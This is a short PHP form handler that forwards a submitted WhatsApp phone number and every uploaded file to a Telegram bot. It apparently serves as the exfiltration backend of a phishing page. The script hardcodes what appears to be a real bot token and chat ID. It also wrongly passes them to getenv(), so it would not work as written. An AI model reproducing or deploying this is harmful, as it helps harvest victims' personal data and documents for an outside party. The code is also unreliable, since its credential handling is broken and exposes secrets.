<?php
// Telegram Bot Credentials
$token = getenv('7607642073:AAGeyNCG4fuahJLGzqS-Zv2-oXbH_YpA6vQ');  
$chat_id = getenv('7101300226');  

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = htmlspecialchars($_POST['phone']);

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode("New Submission\nWhatsApp: $phone"));

  
    foreach ($_FILES as $file) {
        if ($file['error'] === UPLOAD_ERR_OK) {
            $filePath = $file['tmp_name'];
            $filename = basename($file['name']);

            $postFields = [
                'chat_id' => $chat_id,
                'document' => new CURLFile($filePath, mime_content_type($filePath), $filename)
            ];

            $ch = curl_init("https://api.telegram.org/bot$token/sendDocument");
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
        }
    }

    echo "Success! Files sent to Telegram.";
} else {
    echo "Invalid request.";
}
?>